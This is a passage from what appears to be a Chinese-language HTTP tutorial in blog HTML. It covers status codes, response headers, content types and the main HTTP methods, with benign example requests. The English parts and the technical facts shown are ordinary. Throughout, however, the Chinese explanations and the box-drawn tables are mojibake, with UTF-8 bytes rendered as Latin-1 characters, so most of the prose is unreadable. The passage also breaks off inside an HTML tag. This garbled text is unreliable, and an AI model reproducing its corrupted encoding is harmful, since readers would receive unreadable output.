â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="3-2-çŠ¶æ€è¡Œ"><a href="#3-2-çŠ¶æ€è¡Œ" class="headerlink" title="3.2 çŠ¶æ€è¡Œ"></a>3.2 çŠ¶æ€è¡Œ</h3><p><strong>æ ¼å¼</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">HTTPç‰ˆæœ¬ çŠ¶æ€ç  çŠ¶æ€æè¿°<br><br>ç¤ºä¾‹ï¼š<br>HTTP/<span class="hljs-number">1.1 200</span> OK<br>HTTP/<span class="hljs-number">1.1 404</span> Not Found<br>HTTP/<span class="hljs-number">1.1 500</span> Internal Server Error<br></code></pre></td></tr></table></figure><h3 id="3-3-çŠ¶æ€ç "><a href="#3-3-çŠ¶æ€ç " class="headerlink" title="3.3 çŠ¶æ€ç "></a>3.3 çŠ¶æ€ç </h3><p><strong>çŠ¶æ€ç åˆ†ç±»</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  ç±»åˆ«   â”‚      èŒƒå›´        â”‚      å«ä¹‰          â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  <span class="hljs-number">1</span>xx    â”‚  <span class="hljs-number">100-199</span>         â”‚  ä¿¡æ¯æ€§å“åº”        â”‚<br>â”‚  <span class="hljs-number">2</span>xx    â”‚  <span class="hljs-number">200-299</span>         â”‚  æˆåŠŸ              â”‚<br>â”‚  <span class="hljs-number">3</span>xx    â”‚  <span class="hljs-number">300-399</span>         â”‚  é‡å®šå‘            â”‚<br>â”‚  <span class="hljs-number">4</span>xx    â”‚  <span class="hljs-number">400-499</span>         â”‚  å®¢æˆ·ç«¯é”™è¯¯        â”‚<br>â”‚  <span class="hljs-number">5</span>xx    â”‚  <span class="hljs-number">500-599</span>         â”‚  æœåŠ¡å™¨é”™è¯¯        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>1xx ä¿¡æ¯æ€§å“åº”</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">100 Continue<br><span class="hljs-bullet">  -</span> å®¢æˆ·ç«¯åº”ç»§ç»­å‘é€è¯·æ±‚ä½“<br><span class="hljs-bullet">  -</span> ç”¨äºå¤§æ–‡ä»¶ä¸Šä¼ å‰çš„ç¡®è®¤<br><br>101 Switching Protocols<br><span class="hljs-bullet">  -</span> åˆ‡æ¢åè®®ï¼ˆå¦‚WebSocketå‡çº§ï¼‰<br></code></pre></td></tr></table></figure><p><strong>2xx æˆåŠŸ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">200 OK<br><span class="hljs-bullet">  -</span> è¯·æ±‚æˆåŠŸ<br><span class="hljs-bullet">  -</span> æœ€å¸¸è§çš„æˆåŠŸçŠ¶æ€ç <br><br>201 Created<br><span class="hljs-bullet">  -</span> èµ„æºå·²åˆ›å»º<br><span class="hljs-bullet">  -</span> å¸¸ç”¨äºPOSTè¯·æ±‚åˆ›å»ºæ–°èµ„æº<br><br>202 Accepted<br><span class="hljs-bullet">  -</span> è¯·æ±‚å·²æ¥å—ï¼Œä½†å¤„ç†æœªå®Œæˆ<br><span class="hljs-bullet">  -</span> ç”¨äºå¼‚æ­¥å¤„ç†<br><br>204 No Content<br><span class="hljs-bullet">  -</span> æˆåŠŸï¼Œä½†æ— å†…å®¹è¿”å›<br><span class="hljs-bullet">  -</span> å¸¸ç”¨äºDELETEè¯·æ±‚<br><br>206 Partial Content<br><span class="hljs-bullet">  -</span> éƒ¨åˆ†å†…å®¹<br><span class="hljs-bullet">  -</span> ç”¨äºæ–­ç‚¹ç»­ä¼ <br></code></pre></td></tr></table></figure><p><strong>3xx é‡å®šå‘</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">301 Moved Permanently<br><span class="hljs-bullet">  -</span> æ°¸ä¹…é‡å®šå‘<br><span class="hljs-bullet">  -</span> æœç´¢å¼•æ“ä¼šæ›´æ–°ç´¢å¼•<br><span class="hljs-bullet">  -</span> ç¤ºä¾‹ï¼šhttp â†’ https<br><br>302 Foundï¼ˆä¸´æ—¶é‡å®šå‘ï¼‰<br><span class="hljs-bullet">  -</span> ä¸´æ—¶é‡å®šå‘<br><span class="hljs-bullet">  -</span> åŸURLä»ç„¶æœ‰æ•ˆ<br><br>303 See Other<br><span class="hljs-bullet">  -</span> æŸ¥çœ‹å…¶ä»–ä½ç½®<br><span class="hljs-bullet">  -</span> POSTè¯·æ±‚åé‡å®šå‘åˆ°GET<br><br>304 Not Modified<br><span class="hljs-bullet">  -</span> èµ„æºæœªä¿®æ”¹<br><span class="hljs-bullet">  -</span> å¯ä½¿ç”¨ç¼“å­˜<br><br>307 Temporary Redirect<br><span class="hljs-bullet">  -</span> ä¸´æ—¶é‡å®šå‘ï¼ˆä¿æŒè¯·æ±‚æ–¹æ³•ï¼‰<br><br>308 Permanent Redirect<br><span class="hljs-bullet">  -</span> æ°¸ä¹…é‡å®šå‘ï¼ˆä¿æŒè¯·æ±‚æ–¹æ³•ï¼‰<br></code></pre></td></tr></table></figure><p><strong>4xx å®¢æˆ·ç«¯é”™è¯¯</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">400 Bad Request<br><span class="hljs-bullet">  -</span> è¯·æ±‚æ ¼å¼é”™è¯¯<br><span class="hljs-bullet">  -</span> å‚æ•°é”™è¯¯<br><br>401 Unauthorized<br><span class="hljs-bullet">  -</span> æœªè®¤è¯<br><span class="hljs-bullet">  -</span> éœ€è¦ç™»å½•<br><br>403 Forbidden<br><span class="hljs-bullet">  -</span> ç¦æ­¢è®¿é—®<br><span class="hljs-bullet">  -</span> å·²è®¤è¯ä½†æ— æƒé™<br><br>404 Not Found<br><span class="hljs-bullet">  -</span> èµ„æºä¸å­˜åœ¨<br><span class="hljs-bullet">  -</span> æœ€å¸¸è§çš„é”™è¯¯<br><br>405 Method Not Allowed<br><span class="hljs-bullet">  -</span> ä¸æ”¯æŒçš„HTTPæ–¹æ³•<br><br>408 Request Timeout<br><span class="hljs-bullet">  -</span> è¯·æ±‚è¶…æ—¶<br><br>409 Conflict<br><span class="hljs-bullet">  -</span> èµ„æºå†²çª<br><span class="hljs-bullet">  -</span> å¦‚é‡å¤åˆ›å»º<br><br>413 Payload Too Large<br><span class="hljs-bullet">  -</span> è¯·æ±‚ä½“è¿‡å¤§<br><br>414 URI Too Long<br><span class="hljs-bullet">  -</span> URLè¿‡é•¿<br><br>415 Unsupported Media Type<br><span class="hljs-bullet">  -</span> ä¸æ”¯æŒçš„Content-Type<br><br>429 Too Many Requests<br><span class="hljs-bullet">  -</span> è¯·æ±‚è¿‡äºé¢‘ç¹<br><span class="hljs-bullet">  -</span> é™æµ<br></code></pre></td></tr></table></figure><p><strong>5xx æœåŠ¡å™¨é”™è¯¯</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">500 Internal Server Error<br><span class="hljs-bullet">  -</span> æœåŠ¡å™¨å†…éƒ¨é”™è¯¯<br><span class="hljs-bullet">  -</span> æœ€å¸¸è§çš„æœåŠ¡å™¨é”™è¯¯<br><br>501 Not Implemented<br><span class="hljs-bullet">  -</span> åŠŸèƒ½æœªå®ç°<br><br>502 Bad Gateway<br><span class="hljs-bullet">  -</span> ç½‘å…³é”™è¯¯<br><span class="hljs-bullet">  -</span> ä¸Šæ¸¸æœåŠ¡å™¨è¿”å›æ— æ•ˆå“åº”<br><br>503 Service Unavailable<br><span class="hljs-bullet">  -</span> æœåŠ¡ä¸å¯ç”¨<br><span class="hljs-bullet">  -</span> æœåŠ¡å™¨è¿‡è½½æˆ–ç»´æŠ¤<br><br>504 Gateway Timeout<br><span class="hljs-bullet">  -</span> ç½‘å…³è¶…æ—¶<br><span class="hljs-bullet">  -</span> ä¸Šæ¸¸æœåŠ¡å™¨è¶…æ—¶<br><br>505 HTTP Version Not Supported<br><span class="hljs-bullet">  -</span> HTTPç‰ˆæœ¬ä¸æ”¯æŒ<br></code></pre></td></tr></table></figure><h3 id="3-4-å“åº”å¤´"><a href="#3-4-å“åº”å¤´" class="headerlink" title="3.4 å“åº”å¤´"></a>3.4 å“åº”å¤´</h3><p><strong>å¸¸ç”¨å“åº”å¤´</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html; charset=utf-8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å“åº”ä½“çš„MIMEç±»å‹</span><br><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1234</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å“åº”ä½“çš„é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰</span><br><br><span class="hljs-attribute">Content-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å“åº”ä½“çš„å‹ç¼©æ–¹å¼</span><br><br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mon, 15 Jan 2024 10:00:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å“åº”æ—¶é—´</span><br><br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nginx/1.18.0</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">æœåŠ¡å™¨è½¯ä»¶ä¿¡æ¯</span><br><br><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">session_id=abc123; Path=/; HttpOnly</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è®¾ç½®Cookie</span><br><br><span class="hljs-attribute">Location</span><span class="hljs-punctuation">:</span> <span class="hljs-string">https://www.example.com/new-url</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">é‡å®šå‘ç›®æ ‡URL</span><br><br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">:</span> <span class="hljs-string">max-age=3600</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ç¼“å­˜æ§åˆ¶</span><br><br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2025 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è¿‡æœŸæ—¶é—´</span><br><br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">èµ„æºç‰ˆæœ¬æ ‡è¯†</span><br><br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2015 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">æœ€åä¿®æ”¹æ—¶é—´</span><br><br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">CORSè·¨åŸŸæ§åˆ¶</span><br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è¿æ¥ç®¡ç†</span><br><br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">chunked</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">åˆ†å—ä¼ è¾“ç¼–ç </span><br><br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Accept-Encoding</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ç¼“å­˜å˜åŒ–å› ç´ </span><br></code></pre></td></tr></table></figure><h3 id="3-5-å“åº”ä½“"><a href="#3-5-å“åº”ä½“" class="headerlink" title="3.5 å“åº”ä½“"></a>3.5 å“åº”ä½“</h3><p><strong>å¸¸è§Content-Type</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">text/html        - HTMLé¡µé¢<br>text/plain       - çº¯æ–‡æœ¬<br>text/css         - CSSæ ·å¼è¡¨<br>text/javascript  - JavaScriptä»£ç <br><br>application/json        - JSONæ•°æ®<br>application/xml         - XMLæ•°æ®<br>application/pdf         - PDFæ–‡ä»¶<br>application/zip         - ZIPå‹ç¼©åŒ…<br>application/octet-stream - äºŒè¿›åˆ¶æµï¼ˆä¸‹è½½ï¼‰<br><br>image/jpeg       - JPEGå›¾ç‰‡<br>image/png        - PNGå›¾ç‰‡<br>image/gif        - GIFå›¾ç‰‡<br>image/svg+xml    - SVGçŸ¢é‡å›¾<br><br>video/mp4        - MP4è§†é¢‘<br>audio/mpeg       - MP3éŸ³é¢‘<br></code></pre></td></tr></table></figure><hr><h2 id="4-HTTPæ–¹æ³•è¯¦è§£"><a href="#4-HTTPæ–¹æ³•è¯¦è§£" class="headerlink" title="4. HTTPæ–¹æ³•è¯¦è§£"></a>4. HTTPæ–¹æ³•è¯¦è§£</h2><h3 id="4-1-GETæ–¹æ³•"><a href="#4-1-GETæ–¹æ³•" class="headerlink" title="4.1 GETæ–¹æ³•"></a>4.1 GETæ–¹æ³•</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ldif">ä½œç”¨ï¼š<br>è·å–èµ„æºï¼ˆåªè¯»ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-literal">-</span> å‚æ•°åœ¨URLä¸­ï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰<br><span class="hljs-literal">-</span> å¯ç¼“å­˜<br><span class="hljs-literal">-</span> å¯æ·»åŠ ä¹¦ç­¾<br><span class="hljs-literal">-</span> å¹‚ç­‰æ€§ï¼ˆå¤šæ¬¡è¯·æ±‚ç»“æœç›¸åŒï¼‰<br><span class="hljs-literal">-</span> å®‰å…¨æ€§ï¼ˆä¸ä¿®æ”¹æœåŠ¡å™¨çŠ¶æ€ï¼‰<br><br>ç¤ºä¾‹ï¼š<br>GET /api/users?id=123&amp;name=Alice HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-literal">-</span> è·å–ç½‘é¡µ<br><span class="hljs-literal">-</span> æŸ¥è¯¢æ•°æ®<br><span class="hljs-literal">-</span> ä¸‹è½½æ–‡ä»¶<br><span class="hljs-literal">-</span> APIæŸ¥è¯¢<br></code></pre></td></tr></table></figure><h3 id="4-2-POSTæ–¹æ³•"><a href="#4-2-POSTæ–¹æ³•" class="headerlink" title="4.2 POSTæ–¹æ³•"></a>4.2 POSTæ–¹æ³•</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä½œç”¨ï¼š<br>æäº¤æ•°æ®ï¼ˆåˆ›å»ºèµ„æºï¼‰<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">-</span> å‚æ•°åœ¨è¯·æ±‚ä½“ä¸­<br><span class="hljs-bullet">-</span> ä¸å¯ç¼“å­˜<br><span class="hljs-bullet">-</span> ä¸å¯æ·»åŠ ä¹¦ç­¾<br><span class="hljs-bullet">-</span> éå¹‚ç­‰ï¼ˆå¤šæ¬¡è¯·æ±‚å¯èƒ½äº§ç”Ÿä¸åŒç»“æœï¼‰<br><span class="hljs-bullet">-</span> éå®‰å…¨ï¼ˆä¼šä¿®æ”¹æœåŠ¡å™¨çŠ¶æ€ï¼‰<br><br>ç¤ºä¾‹ï¼š<br>POST /api/users HTTP/1.1<br>Host: api.example.com<br>Content-Type: application/json<br><br>&#123;<br><span class="hljs-code">    &quot;name&quot;: &quot;Alice&quot;,</span><br><span class="hljs-code">    &quot;email&quot;: &quot;alice@example.com&quot;</span><br><span class="hljs-code">&#125;</span><br><span class="hljs-code"></span><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">-</span> æäº¤è¡¨å•<br><span class="hljs-bullet">-</span> ä¸Šä¼ æ–‡ä»¶<br><span class="hljs-bullet">-</span> åˆ›å»ºèµ„æº<br><span class="hljs-bullet">-</span> APIæäº¤<br></code></pre></td></tr></table></figure><h3 id="4-3-PUTæ–¹æ³•"><a href="#4-3-PUTæ–¹æ³•" class="headerlink" title="4.3 PUTæ–¹æ³•"></a>4.3 PUTæ–¹æ³•</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">ä½œç”¨ï¼š<br>æ›´æ–°èµ„æºï¼ˆå®Œæ•´æ›´æ–°ï¼‰<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-operator">-</span> å¹‚ç­‰ï¼ˆå¤šæ¬¡è¯·æ±‚ç»“æœç›¸åŒï¼‰<br><span class="hljs-operator">-</span> æ›¿æ¢æ•´ä¸ªèµ„æº<br><br>ç¤ºä¾‹ï¼š<br>PUT <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> api.example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<br>    <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">123</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice Updated&quot;</span>,<br>    <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;alice@example.com&quot;</span><br>&#125;<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-operator">-</span> å®Œæ•´æ›´æ–°èµ„æº<br><span class="hljs-operator">-</span> æ›¿æ¢æ–‡ä»¶<br></code></pre></td></tr></table></figure><h3 id="4-4-DELETEæ–¹æ³•"><a href="#4-4-DELETEæ–¹æ³•" class="headerlink" title="4.4 DELETEæ–¹æ³•"></a>4.4 DELETEæ–¹æ³•</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ldif">ä½œç”¨ï¼š<br>åˆ é™¤èµ„æº<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-literal">-</span> å¹‚ç­‰ï¼ˆå¤šæ¬¡åˆ é™¤åŒä¸€èµ„æºç»“æœç›¸åŒï¼‰<br><br>ç¤ºä¾‹ï¼š<br>DELETE /api/users/123 HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-literal">-</span> åˆ é™¤ç”¨æˆ·<br><span class="hljs-literal">-</span> åˆ é™¤æ–‡ä»¶<br><span class="hljs-literal">-</span> æ³¨é”€è´¦å·<br></code></pre></td></tr></table></figure><h3 id="4-5-PATCHæ–¹æ³•"><a href="#4-5-PATCHæ–¹æ³•" class="headerlink" title="4.5 PATCHæ–¹æ³•"></a>4.5 PATCHæ–¹æ³•</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nix">ä½œç”¨ï¼š<br>éƒ¨åˆ†æ›´æ–°èµ„æº<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-operator">-</span> åªæ›´æ–°éƒ¨åˆ†å­—æ®µ<br><span class="hljs-operator">-</span> æ¯”PUTæ›´èŠ‚çœå¸¦å®½<br><br>ç¤ºä¾‹ï¼š<br>PATCH <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> api.example.com<br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><br>&#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice Updated&quot;</span><br>&#125;<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-operator">-</span> åªæ›´æ–°æŸäº›å­—æ®µ<br><span class="hljs-operator">-</span> ä¿®æ”¹é…ç½®<br></code></pre></td></tr></table></figure><h3 id="4-6-HEADæ–¹æ³•"><a href="#4-6-HEADæ–¹æ³•" class="headerlink" title="4.6 HEADæ–¹æ³•"></a>4.6 HEADæ–¹æ³•</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ldif">ä½œç”¨ï¼š<br>è·å–èµ„æºå¤´éƒ¨ä¿¡æ¯<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-literal">-</span> ä¸è¿”å›å“åº”ä½“<br><span class="hljs-literal">-</span> ç”¨äºæ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨<br><span class="hljs-literal">-</span> ç”¨äºè·å–å…ƒæ•°æ®<br><br>ç¤ºä¾‹ï¼š<br>HEAD /api/users/123 HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-literal">-</span> æ£€æŸ¥èµ„æºæ˜¯å¦å­˜åœ¨<br><span class="hljs-literal">-</span> è·å–æ–‡ä»¶å¤§å°<br><span class="hljs-literal">-</span> æ£€æŸ¥æœ€åä¿®æ”¹æ—¶é—´<br></code></pre></td></tr></table></figure><h3 id="4-7-OPTIONSæ–¹æ³•"><a href="#4-7-OPTIONSæ–¹æ³•" class="headerlink" title="4.7 OPTIONSæ–¹æ³•"></a>4.7 OPTIONSæ–¹æ³•</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 